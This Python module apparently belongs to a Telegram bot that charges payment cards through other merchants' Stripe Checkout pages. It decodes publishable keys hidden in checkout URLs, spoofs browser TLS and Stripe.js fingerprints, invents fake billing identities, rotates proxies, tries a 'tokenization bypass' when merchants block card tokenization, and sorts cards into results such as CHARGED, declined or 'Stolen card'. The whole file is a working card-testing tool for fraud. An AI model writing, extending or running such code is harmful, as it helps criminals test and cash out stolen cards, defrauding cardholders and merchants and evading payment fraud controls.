"""
Stripe Checkout TLS Module - Proper browser-like TLS fingerprinting
Handles different checkout types (email required, billing required, etc.)
"""

import tls_client
import aiohttp
import random
import string
import time
import re
import json
import base64
import ssl
import logging
from urllib.parse import unquote, urlencode
from typing import Optional, Dict, Any, List, Tuple

log = logging.getLogger("stripe_tls")

# Browser profiles for TLS client
BROWSER_PROFILES = [
    "chrome_120",
    "chrome_119", 
    "chrome_117",
    "safari_16_0",
    "firefox_120",
]

CURRENCY_SYMBOLS = {
    'usd': '$', 'eur': '€', 'gbp': '£', 'jpy': '¥', 'cny': '¥',
    'inr': '₹', 'krw': '₩', 'rub': '₽', 'brl': 'R$', 'aud': 'A$',
    'cad': 'C$', 'chf': 'CHF', 'hkd': 'HK$', 'sgd': 'S$', 'sek': 'kr',
    'nok': 'kr', 'dkk': 'kr', 'pln': 'zł', 'thb': '฿', 'mxn': 'MX$',
    'idr': 'Rp', 'try': '₺', 'zar': 'R', 'php': '₱', 'myr': 'RM',
    'npr': '₨', 'pkr': '₨', 'lkr': '₨', 'bdt': '৳', 'vnd': '₫',
    'aed': 'د.إ', 'sar': '﷼', 'egp': 'E£', 'ngn': '₦', 'kes': 'KSh',
    'cop': 'COL$', 'ars': 'AR$', 'clp': 'CL$', 'pen': 'S/.', 'uah': '₴',
    'czk': 'Kč', 'huf': 'Ft', 'ron': 'lei', 'bgn': 'лв', 'hrk': 'kn',
    'twd': 'NT$', 'ils': '₪', 'qar': 'QR', 'kwd': 'د.ك', 'bhd': 'BD',
}

# Standard headers
HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
}

# Shared aiohttp session
_aio_session = None

# Last full confirm error for debugging
_last_confirm_debug = {}


async def get_aio_session():
    """Get or create aiohttp session for fallback"""
    global _aio_session
    if _aio_session is None or _aio_session.closed:
        _aio_session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ssl=False),
            timeout=aiohttp.ClientTimeout(total=30, connect=10)
        )
    return _aio_session


def get_tls_session(proxy: str = None) -> tls_client.Session:
    """Create a TLS session with browser-like fingerprint"""
    try:
        session = tls_client.Session(
            client_identifier=random.choice(BROWSER_PROFILES),
            random_tls_extension_order=True
        )
        
        if proxy:
            session.proxies = {
                "http": proxy,
                "https": proxy
            }
        
        return session
    except Exception:
        # Fallback to basic session
        session = tls_client.Session(
            client_identifier="chrome_120",
            random_tls_extension_order=False
        )
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        return session


def generate_stripe_fingerprint() -> Dict[str, str]:
    """Generate Stripe.js-like fingerprint data"""
    chars = "0123456789abcdefghijklmnopqrstuvwxyz"
    
    return {
        "guid": "".join(random.choices(chars, k=32)),
        "muid": "".join(random.choices(chars, k=32)),
        "sid": "".join(random.choices(chars, k=32)),
        "payment_user_agent": "stripe.js/7a7dd6d24d; stripe-js-v3/7a7dd6d24d; checkout",
        "time_on_page": str(random.randint(30000, 180000)),
        "referrer": "https://checkout.stripe.com",
        "pasted_fields": "number",
    }


def generate_random_email() -> str:
    """Generate a random email for checkouts that require it"""
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]
    name = "".join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))
    num = random.randint(10, 99)
    return f"{name}{num}@{random.choice(domains)}"


def generate_random_name() -> str:
    """Generate random name for billing"""
    first_names = ["John", "James", "Michael", "David", "Robert", "William", "Richard", 
                   "Joseph", "Thomas", "Christopher", "Sarah", "Jennifer", "Lisa", "Emily"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
                  "Davis", "Rodriguez", "Martinez", "Wilson", "Anderson", "Taylor"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"


def generate_random_phone() -> str:
    """Generate a random US phone number"""
    area = random.choice(["212", "310", "415", "312", "713", "602", "215", "469"])
    return f"+1{area}{random.randint(2000000, 9999999)}"


def generate_random_address() -> Dict[str, str]:
    """Generate random US billing address"""
    addresses = [
        {"line1": "476 West White Mountain Blvd", "city": "Pinetop", "state": "AZ", "postal_code": "85929"},
        {"line1": "123 Main Street", "city": "New York", "state": "NY", "postal_code": "10001"},
        {"line1": "456 Oak Avenue", "city": "Los Angeles", "state": "CA", "postal_code": "90001"},
        {"line1": "789 Pine Road", "city": "Chicago", "state": "IL", "postal_code": "60601"},
        {"line1": "321 Elm Street", "city": "Houston", "state": "TX", "postal_code": "77001"},
        {"line1": "654 Maple Drive", "city": "Phoenix", "state": "AZ", "postal_code": "85001"},
        {"line1": "987 Cedar Lane", "city": "Philadelphia", "state": "PA", "postal_code": "19101"},
        {"line1": "147 Birch Court", "city": "San Antonio", "state": "TX", "postal_code": "78201"},
    ]
    addr = random.choice(addresses)
    addr["country"] = "US"
    return addr


def decode_pk_from_url(url: str) -> Dict[str, Optional[str]]:
    """Extract PK and CS from Stripe checkout URL"""
    result = {"pk": None, "cs": None}
    
    try:
        # Extract CS from URL
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
        
        if '#' not in url:
            return result
        
        # Decode hash fragment
        hash_part = url.split('#')[1]
        hash_decoded = unquote(hash_part)
        
        decoded_bytes = base64.b64decode(hash_decoded)
        xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
        
        pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
        if pk_match:
            result["pk"] = pk_match.group(0)
            
    except Exception:
        pass
    
    return result


# ─── Checkout Info ───────────────────────────────────────────────────────────

def get_checkout_info_sync(url: str, proxy: str = None, max_retries: int = 2) -> Dict[str, Any]:
    """
    Fetch checkout session info using TLS client
    Returns detailed info about what fields are required
    """
    result = {
        "url": url,
        "pk": None,
        "cs": None,
        "merchant": None,
        "price": None,
        "currency": None,
        "product": None,
        "init_data": None,
        "error": None,
        "success_url": None,
        "requires_email": False,
        "requires_name": False,
        "requires_phone": False,
        "requires_shipping": False,
        "requires_postal_only": False,
        "requires_full_address": False,
        "requires_tos": False,
        "billing_mode": "auto",
        "customer_email": None,
        "customer_name": None,
        "tokenization_blocked": False,
        "checkout_mode": None,
    }
    
    try:
        decoded = decode_pk_from_url(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")
        
        if not result["pk"] or not result["cs"]:
            result["error"] = "Could not decode PK/CS from URL"
            return result
        
        headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://checkout.stripe.com",
            "referer": "https://checkout.stripe.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
        }
        
        body = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"
        init_data = None
        
        # Try direct first (most reliable), proxy as fallback
        for attempt in range(max_retries + 1):
            try:
                use_proxy = None if attempt == 0 else proxy
                session = get_tls_session(use_proxy)
                response = session.post(
                    f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
                    headers=headers,
                    data=body
                )
                init_data = response.json()
                break
            except Exception as e:
                if attempt < max_retries:
                    time.sleep(0.3)
                    continue
                result["error"] = f"Connection failed: {str(e)[:50]}"
                return result
        
        if init_data is None:
            result["error"] = "Failed to get init data"
            return result
        
        if "error" in init_data:
            err_obj = init_data["error"]
            err_msg = err_obj.get("message", "Init failed")
            err_code = err_obj.get("code", "")
            
            if "expired" in err_msg.lower() or "expired" in err_code.lower():
                result["error"] = "SESSION_EXPIRED"
            else:
                result["error"] = err_msg
            return result
        
        result["init_data"] = init_data
        result["checkout_mode"] = init_data.get("mode", "payment")
        
        # Extract merchant info
        acc = init_data.get("account_settings", {})
        result["merchant"] = acc.get("display_name") or acc.get("business_name")
        
        # Extract pricing from multiple sources
        lig = init_data.get("line_item_group")
        inv = init_data.get("invoice")
        pi = init_data.get("payment_intent")
        si = init_data.get("setup_intent")
        
        if lig:
            result["price"] = lig.get("total", 0) / 100
            result["currency"] = lig.get("currency", "").upper()
            if lig.get("line_items"):
                items = lig["line_items"][:3]
                result["product"] = ", ".join(item.get("name", "Product") for item in items)
        elif pi and pi.get("amount"):
            result["price"] = pi.get("amount", 0) / 100
            result["currency"] = pi.get("currency", "usd").upper()
        elif inv:
            result["price"] = inv.get("total", 0) / 100
            result["currency"] = inv.get("currency", "").upper()
        elif si:
            result["price"] = 0
            result["currency"] = (si.get("currency") or "usd").upper()
        
        # Extract success URL
        result["success_url"] = (
            init_data.get("success_url")
            or (init_data.get("after_payment_confirmation_params") or {}).get("success_url")
            or (init_data.get("after_payment_confirmation_params") or {}).get("return_url")
            or init_data.get("return_url")
        )
        
        # Detect checkout requirements
        checkout_options = init_data.get("checkout_options", {})
        customer = init_data.get("customer") or {}
        result["customer_email"] = init_data.get("customer_email") or customer.get("email")
        result["customer_name"] = customer.get("name")
        
        billing_collection = checkout_options.get("billing_address_collection", "auto")
        result["billing_mode"] = billing_collection
        result["requires_email"] = not result["customer_email"]
        result["requires_name"] = billing_collection == "required" or not result["customer_name"]
        
        result["requires_postal_only"] = False
        result["requires_full_address"] = False
        
        if billing_collection == "required":
            form_fields = init_data.get("form_fields", [])
            if any("line1" in str(f) for f in form_fields):
                result["requires_full_address"] = True
            else:
                result["requires_full_address"] = True  # safer: always use full address for "required"
        elif billing_collection == "auto":
            result["requires_postal_only"] = True
            
        shipping_collection = checkout_options.get("shipping_address_collection", {})
        if shipping_collection and shipping_collection.get("allowed_countries"):
            result["requires_shipping"] = True
            
        phone_collection = checkout_options.get("phone_number_collection", {})
        if phone_collection.get("enabled"):
            result["requires_phone"] = True
        
        # Detect consent requirements
        consent = checkout_options.get("consent_collection", {}) or init_data.get("consent_collection", {}) or {}
        tos = consent.get("terms_of_service", "")
        result["requires_tos"] = (tos == "required")
        
        # Detect custom_fields
        custom_fields = init_data.get("custom_fields") or []
        result["has_custom_fields"] = len(custom_fields) > 0
            
    except Exception as e:
        result["error"] = str(e)[:80]
    
    return result


# ─── Billing Helpers ─────────────────────────────────────────────────────────

def _resolve_billing(checkout_data: Dict, init_data: Dict,
                     custom_email: str = None, custom_name: str = None) -> Dict[str, Any]:
    """Resolve ALL billing/customer fields. Always generates fallback values."""
    customer = init_data.get("customer") or {}
    addr = customer.get("address") or {}
    
    fallback = generate_random_address()
    
    return {
        "email": (
            custom_email
            or checkout_data.get("customer_email")
            or init_data.get("customer_email")
            or customer.get("email")
            or generate_random_email()
        ),
        "name": custom_name or customer.get("name") or generate_random_name(),
        "phone": generate_random_phone(),
        "address": {
            "country": addr.get("country") or fallback["country"],
            "postal_code": addr.get("postal_code") or fallback["postal_code"],
            "line1": addr.get("line1") or fallback["line1"],
            "city": addr.get("city") or fallback["city"],
            "state": addr.get("state") or fallback["state"],
        },
    }


def _get_amounts(init_data: Dict) -> Tuple[int, int]:
    """Extract (total, subtotal) from init data."""
    lig = init_data.get("line_item_group")
    pi = init_data.get("payment_intent")
    inv = init_data.get("invoice")
    
    if lig:
        return lig.get("total", 0), lig.get("subtotal", 0)
    if pi and pi.get("amount"):
        amt = pi.get("amount", 0)
        return amt, amt
    if inv:
        return inv.get("total", 0), inv.get("subtotal", 0)
    return 0, 0


def _build_pm_data(card: Dict, pk: str, billing: Dict, fp: Dict) -> Dict[str, str]:
    """Build payment_methods creation payload. Always includes full billing."""
    addr = billing["address"]
    return {
        "type": "card",
        "card[number]": card["cc"],
        "card[cvc]": card["cvv"],
        "card[exp_month]": card["month"],
        "card[exp_year]": card["year"],
        "guid": fp["guid"],
        "muid": fp["muid"],
        "sid": fp["sid"],
        "pasted_fields": fp["pasted_fields"],
        "payment_user_agent": fp["payment_user_agent"],
        "time_on_page": fp["time_on_page"],
        "referrer": fp["referrer"],
        "key": pk,
        "billing_details[name]": billing["name"],
        "billing_details[email]": billing["email"],
        "billing_details[address][country]": addr["country"],
        "billing_details[address][postal_code]": addr["postal_code"],
        "billing_details[address][line1]": addr["line1"],
        "billing_details[address][city]": addr["city"],
        "billing_details[address][state]": addr["state"],
    }


def _build_confirm_data(pm_id_or_data: Any, pk: str, cs: str, init_data: Dict,
                        checkout_data: Dict, billing: Dict, is_direct: bool = False) -> Dict[str, str]:
    """
    Build the confirm payload. Only includes parameters the endpoint accepts.
    Billing info goes in the payment_method (created separately or embedded).
    The confirm endpoint only accepts: eid, payment_method, expected_amount,
    expected_payment_method_type, key, init_checksum, return_url, consent, 
    and last_displayed_line_item_group_details.
    """
    total, subtotal = _get_amounts(init_data)
    checksum = init_data.get("init_checksum", "")
    checkout_mode = checkout_data.get("checkout_mode") or init_data.get("mode", "payment")
    addr = billing["address"]
    
    conf = {
        "eid": "NA",
        "expected_payment_method_type": "card",
        "key": pk,
        "init_checksum": checksum,
        "return_url": "https://checkout.stripe.com",
    }
    
    # Payment method: either PM ID or embedded card data (direct confirm)
    if is_direct and isinstance(pm_id_or_data, dict):
        card = pm_id_or_data["card"]
        fp = pm_id_or_data["fp"]
        conf.update({
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card["cc"],
            "payment_method_data[card][cvc]": card["cvv"],
            "payment_method_data[card][exp_month]": card["month"],
            "payment_method_data[card][exp_year]": card["year"],
            "payment_method_data[guid]": fp["guid"],
            "payment_method_data[muid]": fp["muid"],
            "payment_method_data[sid]": fp["sid"],
            "payment_method_data[pasted_fields]": fp["pasted_fields"],
            "payment_method_data[payment_user_agent]": fp["payment_user_agent"],
            "payment_method_data[billing_details][name]": billing["name"],
            "payment_method_data[billing_details][email]": billing["email"],
            "payment_method_data[billing_details][address][country]": addr["country"],
            "payment_method_data[billing_details][address][postal_code]": addr["postal_code"],
            "payment_method_data[billing_details][address][line1]": addr["line1"],
            "payment_method_data[billing_details][address][city]": addr["city"],
            "payment_method_data[billing_details][address][state]": addr["state"],
        })
    else:
        conf["payment_method"] = pm_id_or_data
    
    # expected_amount
    if checkout_mode == "setup":
        conf["expected_amount"] = 0
    else:
        conf["expected_amount"] = total
    
    # Consent: always send ToS accepted (safe — Stripe ignores if not required)
    conf["consent[terms_of_service]"] = "accepted"
    
    # Line item details: for payment/subscription modes
    if checkout_mode != "setup":
        conf["last_displayed_line_item_group_details[subtotal]"] = subtotal
        conf["last_displayed_line_item_group_details[total_exclusive_tax]"] = 0
        conf["last_displayed_line_item_group_details[total_inclusive_tax]"] = 0
        conf["last_displayed_line_item_group_details[total_discount_amount]"] = 0
        conf["last_displayed_line_item_group_details[shipping_rate_amount]"] = 0
    
    return conf


def _do_confirm(session, headers: Dict, cs: str, conf_data: Dict) -> Dict:
    """Execute confirm request and return JSON response."""
    resp = session.post(
        f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
        headers=headers,
        data=urlencode(conf_data)
    )
    return resp.json()


def _is_confirm_error(conf: Dict) -> bool:
    """Check if response is the generic 'error confirming' message."""
    if "error" not in conf:
        return False
    msg = conf["error"].get("message", "").lower()
    return "error" in msg and "confirming" in msg


# ─── Main Charge Function ───────────────────────────────────────────────────

def charge_card_sync(
    card: Dict[str, str],
    checkout_data: Dict[str, Any],
    proxy: str = None,
    custom_email: str = None,
    custom_name: str = None,
    max_retries: int = 2
) -> Dict[str, Any]:
    """
    Charge a card using TLS client with proper browser fingerprint.
    Handles different checkout requirements automatically.
    Uses progressive retry on confirm errors.
    """
    global _last_confirm_debug
    start = time.perf_counter()
    
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "time": 0,
        "success_url": None,
    }
    
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    
    if not pk or not cs or not init_data:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    
    # Resolve billing once
    billing = _resolve_billing(checkout_data, init_data, custom_email, custom_name)
    
    for attempt in range(max_retries + 1):
        try:
            # Always try direct first (most reliable), proxy only as last resort
            use_proxy = None if attempt == 0 else proxy
            session = get_tls_session(use_proxy)
            
            headers = {
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://checkout.stripe.com",
                "referer": "https://checkout.stripe.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
            }
            
            fp = generate_stripe_fingerprint()
            
            # ── Step 1: Create Payment Method ──
            pm_data = _build_pm_data(card, pk, billing, fp)
            
            pm_response = session.post(
                "https://api.stripe.com/v1/payment_methods",
                headers=headers,
                data=urlencode(pm_data)
            )
            pm = pm_response.json()
            
            if "error" in pm:
                err_msg = pm["error"].get("message", "Card error")
                low = err_msg.lower()
                
                if "integration surface" in low or "tokenization" in low or "unsupported" in low:
                    # Fallback: try direct confirm with embedded card data
                    conf_result = _try_direct_confirm(
                        session, headers, cs, pk, card, billing, fp,
                        checkout_data, init_data, result, start
                    )
                    if conf_result:
                        return conf_result
                    
                    result["status"] = "NOT SUPPORTED"
                    result["response"] = "Merchant blocked tokenization"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result
                
                result["status"] = "DECLINED"
                result["response"] = _clean_response(err_msg)
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            
            pm_id = pm.get("id")
            if not pm_id:
                result["status"] = "FAILED"
                result["response"] = "No payment method ID"
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            
            # ── Step 2: Confirm ──
            conf_data = _build_confirm_data(pm_id, pk, cs, init_data, checkout_data, billing)
            conf = _do_confirm(session, headers, cs, conf_data)
            
            # ── Step 3: Progressive retry on "error confirming" ──
            if _is_confirm_error(conf):
                _last_confirm_debug = conf
                conf = _progressive_retry(session, headers, cs, conf_data, billing, checkout_data, init_data)
            
            return _parse_confirm_result(conf, checkout_data, result, start)
            
        except Exception as e:
            # Retry on ANY exception if we have attempts left
            if attempt < max_retries:
                time.sleep(0.3)
                continue
            
            result["status"] = "ERROR"
            result["response"] = str(e)[:50]
            result["time"] = round(time.perf_counter() - start, 2)
            return result
    
    result["status"] = "ERROR"
    result["response"] = "Max retries exceeded"
    result["time"] = round(time.perf_counter() - start, 2)
    return result


def _progressive_retry(session, headers: Dict, cs: str, base_conf: Dict,
                       billing: Dict, checkout_data: Dict, init_data: Dict) -> Dict:
    """
    Retry confirm with different strategies when generic 'error confirming' occurs.
    Only uses fields that the confirm endpoint actually accepts.
    """
    
    # Strategy 1: Try WITHOUT consent (maybe consent is causing the issue)
    retry1 = dict(base_conf)
    retry1.pop("consent[terms_of_service]", None)
    conf1 = _do_confirm(session, headers, cs, retry1)
    if not _is_confirm_error(conf1):
        return conf1
    
    # Strategy 2: Try with expected_amount = 0 (maybe it's a setup/trial checkout)
    retry2 = dict(base_conf)
    retry2["expected_amount"] = 0
    for key in list(retry2.keys()):
        if key.startswith("last_displayed_line_item_group_details"):
            retry2.pop(key)
    conf2 = _do_confirm(session, headers, cs, retry2)
    if not _is_confirm_error(conf2):
        return conf2
    
    # All strategies failed, return last response
    return conf1


# ─── Direct Confirm (tokenization bypass) ────────────────────────────────────

def _try_direct_confirm(
    session, headers, cs, pk, card, billing, fp,
    checkout_data, init_data, result, start
) -> Optional[Dict[str, Any]]:
    """Try to confirm payment with payment_method_data embedded directly."""
    try:
        pm_payload = {"card": card, "fp": fp}
        conf_data = _build_confirm_data(pm_payload, pk, cs, init_data, checkout_data, billing, is_direct=True)
        
        conf = _do_confirm(session, headers, cs, conf_data)
        
        # Progressive retry on error confirming
        if _is_confirm_error(conf):
            conf = _progressive_retry(session, headers, cs, conf_data, billing, checkout_data, init_data)
        
        if "error" in conf:
            err_msg_low = conf["error"].get("message", "").lower()
            if "integration surface" in err_msg_low or "tokenization" in err_msg_low:
                return None
        
        return _parse_confirm_result(conf, checkout_data, result, start)
        
    except Exception:
        return None


# ─── Response Parsing ─────────────────────────────────────────────────────────

def _clean_response(text: str) -> str:
    """Clean and shorten Stripe error messages"""
    if not text:
        return text
    
    low = text.lower()
    
    if "integration surface" in low or "publishable key tokenization" in low:
        return "Restricted key"
    if "error" in low and "confirming" in low:
        # Extract specific field requirement if mentioned
        match = re.search(r'`(\w+)`\s+is\s+required', text)
        if match:
            return f"Missing: {match.group(1)}"
        return "Confirm error (retry failed)"
    if "card_number_invalid" in low or "invalid card number" in low:
        return "Invalid card number"
    if "card_declined" in low or "card was declined" in low:
        return "Card declined"
    if "insufficient_funds" in low:
        return "Insufficient funds"
    if "expired_card" in low or "card has expired" in low:
        return "Card expired"
    if "incorrect_cvc" in low:
        return "Incorrect CVC"
    if "stolen_card" in low:
        return "Stolen card"
    if "lost_card" in low:
        return "Lost card"
    if "do_not_honor" in low:
        return "Do not honor"
    if "fraudulent" in low:
        return "Fraudulent"
    if "pickup_card" in low:
        return "Pickup card"
    if "restricted_card" in low:
        return "Restricted card"
    if "security_violation" in low:
        return "Security violation"
    if "service_not_allowed" in low:
        return "Service not allowed"
    if "transaction_not_allowed" in low:
        return "Transaction not allowed"
    
    text = re.sub(r'\s*\(https?://[^\)]+\)', '', text)
    text = re.sub(r'\s*See https?://\S+', '', text)
    text = re.sub(r'https?://\S+', '', text)
    text = re.sub(r'\s+', ' ', text).strip().rstrip('.')
    
    return text[:100]


def _parse_confirm_result(
    conf: Dict[str, Any],
    checkout_data: Dict[str, Any],
    result: Dict[str, Any],
    start: float
) -> Dict[str, Any]:
    """Parse Stripe confirm response"""
    
    if "error" in conf:
        err = conf["error"]
        dc = err.get("decline_code", "")
        raw = err.get("message", "Declined")
        err_code = err.get("code", "")
        
        # Stripe returns CVC errors in 'code' field, not 'decline_code'
        if not dc and (err_code == "incorrect_cvc" or "security code" in raw.lower()):
            dc = "incorrect_cvc"
        
        if "expired" in raw.lower() or "expired" in err_code.lower():
            result["status"] = "EXPIRED"
            result["response"] = "Session expired"
        elif ("integration surface" in raw.lower() 
              or "tokenization" in raw.lower()
              or "unsupported" in raw.lower()):
            result["status"] = "NOT SUPPORTED"
            result["response"] = "Checkout not supported"
        else:
            # Format: [decline_code] [message] for detailed response
            if dc:
                resp = f"[{dc}] [{raw}]"
            else:
                resp = _clean_response(raw)
            result["status"] = "DECLINED"
            result["response"] = resp
            result["decline_code"] = dc
    else:
        # Check for payment_intent, setup_intent, or direct status
        pi = conf.get("payment_intent") or {}
        si = conf.get("setup_intent") or {}
        st = pi.get("status", "") or si.get("status", "") or conf.get("status", "")
        
        if st == "succeeded":
            success_url = (
                conf.get("success_url")
                or pi.get("success_url")
                or checkout_data.get("success_url")
            )
            # Include amount in response like "Charged USD 20.0"
            price = checkout_data.get("price")
            currency = (checkout_data.get("currency") or "").upper()
            if price is not None:
                charged_msg = f"Charged {currency} {price}"
            else:
                charged_msg = "Payment Successful"
            result["status"] = "CHARGED"
            result["response"] = charged_msg
            result["success_url"] = success_url
        elif st == "requires_action":
            result["status"] = "3DS"
            result["response"] = "3DS Required"
        elif st == "requires_payment_method":
            result["status"] = "DECLINED"
            result["response"] = "Card Declined"
        else:
            result["status"] = "UNKNOWN"
            result["response"] = st or "Unknown"
    
    result["time"] = round(time.perf_counter() - start, 2)
    return result


# ─── Async wrappers for aiogram ──────────────────────────────────────────────
import asyncio

async def get_checkout_info(url: str, proxy: str = None) -> Dict[str, Any]:
    """Async wrapper for get_checkout_info_sync with aiohttp fallback"""
    try:
        return await asyncio.to_thread(get_checkout_info_sync, url, proxy)
    except Exception:
        return await _get_checkout_info_aiohttp(url, proxy)


async def _get_checkout_info_aiohttp(url: str, proxy: str = None) -> Dict[str, Any]:
    """Fallback using aiohttp when TLS client fails"""
    result = {
        "url": url, "pk": None, "cs": None, "merchant": None,
        "price": None, "currency": None, "product": None,
        "init_data": None, "error": None, "success_url": None,
        "requires_email": False, "requires_name": False,
        "requires_phone": False, "requires_shipping": False,
        "requires_postal_only": False, "requires_full_address": False,
        "requires_tos": False,
        "billing_mode": "auto", "customer_email": None,
        "customer_name": None, "tokenization_blocked": False,
        "checkout_mode": None,
    }
    
    try:
        decoded = decode_pk_from_url(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")
        
        if not result["pk"] or not result["cs"]:
            result["error"] = "Could not decode PK/CS from URL"
            return result
        
        session = await get_aio_session()
        body = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"
        
        async with session.post(
            f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
            headers=HEADERS, data=body
        ) as response:
            init_data = await response.json()
        
        if "error" in init_data:
            err_msg = init_data["error"].get("message", "Init failed")
            result["error"] = "SESSION_EXPIRED" if "expired" in err_msg.lower() else err_msg
            return result
        
        result["init_data"] = init_data
        result["checkout_mode"] = init_data.get("mode", "payment")
        
        acc = init_data.get("account_settings", {})
        result["merchant"] = acc.get("display_name") or acc.get("business_name")
        
        lig = init_data.get("line_item_group")
        inv = init_data.get("invoice")
        pi = init_data.get("payment_intent")
        
        if lig:
            result["price"] = lig.get("total", 0) / 100
            result["currency"] = lig.get("currency", "").upper()
        elif pi and pi.get("amount"):
            result["price"] = pi.get("amount", 0) / 100
            result["currency"] = pi.get("currency", "usd").upper()
        elif inv:
            result["price"] = inv.get("total", 0) / 100
            result["currency"] = inv.get("currency", "").upper()
        
        customer = init_data.get("customer") or {}
        result["customer_email"] = init_data.get("customer_email") or customer.get("email")
        result["customer_name"] = customer.get("name")
        result["requires_email"] = not result["customer_email"]
        
        # Parse checkout options for aiohttp fallback too
        checkout_options = init_data.get("checkout_options", {})
        billing_collection = checkout_options.get("billing_address_collection", "auto")
        result["billing_mode"] = billing_collection
        result["requires_full_address"] = (billing_collection == "required")
        result["requires_postal_only"] = (billing_collection == "auto")
        
        phone_coll = checkout_options.get("phone_number_collection", {})
        result["requires_phone"] = phone_coll.get("enabled", False)
        
        shipping_coll = checkout_options.get("shipping_address_collection", {})
        result["requires_shipping"] = bool(shipping_coll and shipping_coll.get("allowed_countries"))
        
        consent = checkout_options.get("consent_collection", {}) or init_data.get("consent_collection", {}) or {}
        result["requires_tos"] = (consent.get("terms_of_service", "") == "required")
        
    except Exception as e:
        result["error"] = f"Connection error: {str(e)[:50]}"
    
    return result


async def charge_card(
    card: Dict[str, str],
    checkout_data: Dict[str, Any],
    proxy: str = None,
    custom_email: str = None,
    custom_name: str = None
) -> Dict[str, Any]:
    """Async wrapper for charge_card_sync"""
    return await asyncio.to_thread(
        charge_card_sync, card, checkout_data,
        proxy, custom_email, custom_name
    )


def get_last_debug() -> Dict:
    """Return the last confirm debug info for /debuglast command"""
    return _last_confirm_debug
